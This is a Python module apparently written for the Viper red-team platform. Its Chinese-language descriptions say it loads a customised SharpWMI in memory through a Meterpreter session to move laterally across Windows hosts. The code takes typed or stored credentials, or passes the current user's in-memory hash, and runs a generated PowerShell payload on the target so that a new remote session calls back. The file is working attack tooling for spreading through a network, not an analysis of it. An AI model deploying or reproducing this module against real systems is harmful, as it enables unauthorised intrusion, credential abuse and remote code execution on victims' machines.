# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :

from Lib.ModuleAPI import *


class PostModule(PostMSFCSharpModule):
    NAME = "Sharpwmi横向移动"
    DESC = "模块内存执行定制版的Sharpwmi.exe.\n" \
           "通过指定的用户名密码或使用当前用户内存中的Hash进行横向移动,通过调用目标主机的powershell加载载荷上线.\n" \
           "与<WMI明文传递>模块相比,该模块不会调用本机的wmi.exe文件"
    MODULETYPE = TAG2CH.Lateral_Movement
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = []  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/pkxmyw"]
    REFERENCES = ["https://github.com/viper-sec/sharpwmi"]
    AUTHOR = "Viper"
    OPTIONS = register_options([
        OptionStr(name='host', name_tag="目标IP", desc="横向移动目标的IP地址",
                  required=True),

        OptionBool(name='pth', name_tag="哈希传递", desc="不使用用户名密码,使用当前用户的内存中的hash进行认证"),

        OptionStr(name='SMBDomain', name_tag="域", desc="目标主机的域,如果目标不在域中则为空"),
        OptionStr(name='SMBUser', name_tag="用户名", desc="smb用户名"),
        OptionStr(name='SMBPass', name_tag="密码", desc="smb密码(不能是hash)"),
        OptionCredentialEnum(required=False, password_type=['windows', ]),

        OptionHander(),
        OptionInt(name='wait', name_tag="等待时间", required=True,
                  desc="读取输出信息前等待的秒数", default=10),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)

    def check(self):
        """执行前的检查函数"""
        session = Session(self._sessionid)
        if session.is_windows is not True:
            return False, "此模块只支持Windows的Meterpreter"

        payload_cmd = self.generate_payload("psh-cmd")
        try:
            payload_cmd = payload_cmd.decode()[63:]
        except Exception as E:
            return True, "生成载荷失败"

        self.set_assembly("sharpwmi")
        self.set_execute_wait(self.param("wait"))

        if self.param("pth"):
            args = f'pth {self.param("host")} exec {payload_cmd}'
        else:
            credential_config = self.get_credential_config()
            if credential_config is not None:
                domain = credential_config.get('tag').get('domain')
                username = credential_config.get('username')
                password = credential_config.get('password')
                # 手工输入覆盖凭证输入
                if self.param('SMBDomain') is not None and self.param('SMBDomain') != "":
                    domain = self.param('SMBDomain')
                if self.param('SMBUser') is not None and self.param('SMBUser') != "":
                    username = self.param('SMBUser')
                if self.param('SMBUser') is not None and self.param('SMBUser') != "":
                    password = self.param('SMBPass')
            else:
                domain = self.param('SMBDomain')
                username = self.param('SMBUser')
                password = self.param('SMBPass')

            if domain is None or domain == "":
                domain_user = username
            else:
                domain_user = f"{domain}\\{username}"

            args = f'{self.param("host")} {domain_user} {password} exec {payload_cmd}'

        self.set_arguments(args)
        return True, None

    def callback(self, status, message, data):
        assembly_out = self.get_console_output(status, message, data)
        self.log_info("结果输出:")
        self.log_raw(assembly_out)
        self.log_info("请等待10s-20s,观察是否有新Session上线")
